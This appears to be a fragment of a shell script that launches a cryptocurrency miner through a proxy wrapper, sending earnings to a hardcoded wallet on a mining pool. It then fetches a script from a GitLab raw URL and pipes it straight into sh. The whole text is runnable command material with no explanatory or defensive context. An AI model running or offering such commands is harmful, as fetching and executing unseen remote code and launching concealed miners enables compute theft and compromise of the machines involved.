...
./graftcp/graftcp ./lol1.84 -a GRAM --pool lolminer.ton.ninja:9999 --user UQDdpOB_jaOswoGqi9kCtWJBttZeh75KYzubDJsNBKx9iKV3 --pass x & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh